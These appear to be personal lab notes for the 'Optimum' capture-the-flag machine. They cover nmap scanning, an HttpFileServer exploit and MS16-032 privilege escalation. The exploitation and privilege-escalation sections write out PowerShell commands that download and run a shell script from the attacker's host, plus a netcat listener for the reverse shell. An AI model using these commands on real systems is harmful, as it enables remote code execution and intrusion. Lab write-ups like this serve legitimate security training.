Optimum
========================

# Enumeration

    sudo nmap_enum 10.10.10.8 | tee nmap_output.txt
    
![qownnotes-media-LyrPnO](../../../media/qownnotes-media-LyrPnO.png)

    
    sudo nmap -sU -p 53,161,111,137,139,500,2049 -Pn 10.10.10.8 | tee nmap_udp_output.txt

    sudo nmap -p- -Pn -T5 -n 10.10.10.8 | tee nmap_fullportstcp_output.txt]
    
![qownnotes-media-xPcWJa](../../../media/qownnotes-media-xPcWJa.png)


    firefox http://optimum.htb

![qownnotes-media-SqtuQf](../../../media/qownnotes-media-SqtuQf.png)

    searchsploit httpfileserver

![qownnotes-media-kzEYno](../../../media/qownnotes-media-kzEYno.png)

# Exploitation


    python exploit.py 10.10.10.8 80 "c:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5:8000/shell.ps1')"
    nc -nlvp 81 

![qownnotes-media-ayBbJm](../../../media/qownnotes-media-ayBbJm.png)



# Privilege Escalation
    
    systeminfo

Windows server 2012 r2

<https://github.com/EmpireProject/Empire/blob/master/data/module_source/privesc/Invoke-MS16032.ps1>
    
    invoke-MS16032 -Command "iex(New-Object Net.WebClient).DownloadString('http://10.10.14.5:8000/shell.ps1')"

![qownnotes-media-QKBsQA](../../../media/qownnotes-media-QKBsQA.png)


![qownnotes-media-gQhNke](../../../media/qownnotes-media-gQhNke.png)

